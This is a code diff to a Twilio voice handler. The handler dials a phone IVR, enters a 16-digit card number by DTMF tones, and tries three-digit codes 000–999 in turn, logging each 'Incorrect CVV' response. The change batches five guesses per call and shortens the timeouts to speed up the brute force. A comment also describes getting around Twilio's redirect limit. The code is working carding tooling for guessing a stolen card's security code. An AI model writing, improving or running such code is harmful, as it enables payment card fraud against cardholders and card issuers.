@@ -63,8 +63,9 @@ export const handleTryCode = async (req, res) => {
     const { attemptId } = req.params;
     let { currentTestCode, isFirst } = req.query;
     
+    let currentCodeNum = parseInt(currentTestCode);
+    
     // Safety check for exhausted codes
-    const currentCodeNum = parseInt(currentTestCode);
     if (currentCodeNum > 999) {
         await AttemptModel.addLog(attemptId, `Exhausted all Test codes 001-999. Failed.`);
         await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'Exhausted 999 Test codes without success' });
@@ -73,10 +74,6 @@ export const handleTryCode = async (req, res) => {
         res.type('text/xml');
         return res.send(twiml.toString());
     }
-    
-    // Ensure 3 digit format
-    currentTestCode = currentCodeNum.toString().padStart(3, '0');
-    const nextTestCode = (currentCodeNum + 1).toString().padStart(3, '0');
     
     // Get base card for logging
     const { data: attempt } = await supabase.from('attempts').select('test_value').eq('id', attemptId).single();
@@ -87,30 +84,42 @@ export const handleTryCode = async (req, res) => {
     
     const twiml = new twilio.twiml.VoiceResponse();
     
-    if (isFirst === 'true') {
-        // First code in the loop needs to play the 16 digit card as well
-        await AttemptModel.addLog(attemptId, `DTMF Sent: ${baseCard}:${currentTestCode}`);
-        const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
-        twiml.pause({ length: waitSeconds });
-        twiml.play({ digits: `ww${baseCard}wwwwwwww${currentTestCode}` });
-    } else {
-        // Subsequent codes just play the 3 digit test code
-        await AttemptModel.addLog(attemptId, `IVR says "Incorrect CVV" for ${(currentCodeNum - 1).toString().padStart(3, '0')}. Trying next...`);
-        await AttemptModel.addLog(attemptId, `DTMF Sent: ${baseCard}:${currentTestCode}`);
-        twiml.play({ digits: `ww${currentTestCode}` });
+    const BATCH_SIZE = 5;
+    const endCodeNum = Math.min(currentCodeNum + BATCH_SIZE, 1000);
+    
+    let lastCodeInBatch = '';
+    const batchLogs = [];
+
+    for (let i = currentCodeNum; i < endCodeNum; i++) {
+        const codeStr = i.toString().padStart(3, '0');
+        lastCodeInBatch = codeStr;
+
+        if (i === currentCodeNum && isFirst === 'true') {
+            batchLogs.push(`DTMF Sent: ${baseCard}:${codeStr}`);
+            const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
+            twiml.pause({ length: waitSeconds });
+            twiml.play({ digits: `ww${baseCard}wwwwwwww${codeStr}` });
+        } else {
+            batchLogs.push(`IVR says "Incorrect CVV" for ${codeStr}. Trying next...`);
+            batchLogs.push(`DTMF Sent: ${baseCard}:${codeStr}`);
+            // Wait 0.5 seconds (1 'w') to let IVR speak before playing next
+            twiml.play({ digits: `w${codeStr}` });
+        }
     }
     
-    // Update the DB so the frontend shows the current Test code progressing
-    await AttemptModel.updateTestValue(attemptId, `${baseCard}:${currentTestCode}`);
+    await AttemptModel.addLogs(attemptId, batchLogs);
     
-    // Give the IVR time to say "Incorrect" (usually 4 seconds is enough, bumped to 6 for safety)
-    // If the code is correct, the IVR says "Thank you" and HANGS UP the call.
-    // We use a Gather verb that times out to bypass Twilio's maximum Redirect limit!
+    // Update the DB so the frontend shows the current Test code progressing
+    await AttemptModel.updateTestValue(attemptId, `${baseCard}:${lastCodeInBatch}`);
+    
+    const nextTestCode = endCodeNum.toString().padStart(3, '0');
+    
+    // Give the IVR time to say "Incorrect" for the final guess in the batch
     const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
     twiml.gather({
         action: `${host}/api/call/try/${attemptId}?currentTestCode=${nextTestCode}&isFirst=false`,
         method: 'POST',
-        timeout: 6,
+        timeout: 1,
         input: 'dtmf',
         numDigits: 1
     });
